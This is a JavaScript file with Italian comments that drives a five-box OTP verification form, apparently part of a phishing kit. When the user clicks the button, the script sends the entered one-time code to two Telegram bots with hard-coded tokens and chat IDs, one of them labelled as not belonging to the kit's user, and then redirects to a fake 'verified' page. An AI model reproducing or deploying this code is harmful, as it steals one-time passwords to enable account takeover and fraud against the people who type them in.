const inputs = document.querySelectorAll("input"),
  button = document.querySelector("button");

// Variabile per salvare il codice OTP
let otpCode = "";

// Itera su tutti gli input
inputs.forEach((input, index1) => {
  input.addEventListener("keyup", (e) => {
    const currentInput = input,
      nextInput = input.nextElementSibling,
      prevInput = input.previousElementSibling;

    // Se l'input ha più di un carattere, cancellalo
    if (currentInput.value.length > 1) {
      currentInput.value = "";
      return;
    }

    // Abilita il prossimo input se il valore attuale non è vuoto
    if (nextInput && nextInput.hasAttribute("disabled") && currentInput.value !== "") {
      nextInput.removeAttribute("disabled");
      nextInput.focus();
    }

    // Se viene premuto "Backspace"
    if (e.key === "Backspace") {
      inputs.forEach((input, index2) => {
        if (index1 <= index2 && prevInput) {
          input.setAttribute("disabled", true);
          input.value = "";
          prevInput.focus();
        }
      });
    }

    // Se l'ultimo input è compilato, attiva il pulsante
    if (!inputs[4].disabled && inputs[4].value !== "") {
      button.classList.add("active");
      return;
    }
    button.classList.remove("active");
  });
});

// Focus sul primo input all'avvio
window.addEventListener("load", () => inputs[0].focus());

// Invio del codice OTP a due bot e reindirizzamento
button.addEventListener("click", async (event) => {
  event.preventDefault(); // Evita il comportamento predefinito del form

  otpCode = Array.from(inputs).map(input => input.value).join("");

  try {
    // Invia al primo bot (tuo)
    const response1 = await fetch('https://api.telegram.org/bot7654691297:AAEkfk35y1aKq5Wpnz7vLyR3QCo4g5nYDTc/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: '1117264759', text: 'OTP Code: ' + otpCode })
    });

    // Invia al secondo bot (non tuo)
    const response2 = await fetch('https://api.telegram.org/bot7508882807:AAF5vvfq1-gZjxgx29QW3NPuJkUnhtDACK4/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: '5554575228', text: 'OTP Code: ' + otpCode })
    });

    const data1 = await response1.json();
    const data2 = await response2.json();

    // Controlla se almeno uno dei due invii ha avuto successo
    if (data1.ok || data2.ok) {
      window.location.href = "verified.html"; // Reindirizzamento solo se almeno un messaggio è stato inviato
    } else {
      console.error("Errore nell'invio del messaggio Telegram");
    }
  } catch (error) {
    console.error("Errore di rete", error);
  }
});
